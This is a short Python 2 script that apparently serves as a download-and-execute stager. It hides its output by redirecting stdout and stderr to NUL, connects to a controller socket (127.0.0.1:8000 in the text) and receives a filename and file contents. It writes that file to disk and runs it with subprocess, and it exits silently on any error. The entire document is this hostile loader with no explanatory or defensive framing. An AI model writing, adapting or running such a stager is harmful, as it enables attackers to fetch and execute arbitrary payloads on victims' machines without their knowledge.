import socket
import sys
from subprocess import call
from time import sleep

socket.setdefaulttimeout(60)

port=8000
ip="127.0.0.1"

try:
 sys.stdout=open("NUL","w")
 sys.stderr=open("NUL","w")
 soc=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 soc.connect((ip,port))
 soc.send("U")
 
 name=soc.recv(50)
 length=int(soc.recv(10))
 f=open(name,"wb") ###############################################
 buf=""
 
 while length:
  data=soc.recv(4096)
  length-=len(data)
  buf+=data
 
 f.write(buf)
 f.close()
 soc.send("DED")
 soc.close()
 sleep(1)
 call([name])

except:
 soc.send("Error")
 soc.close()
 exit(0)
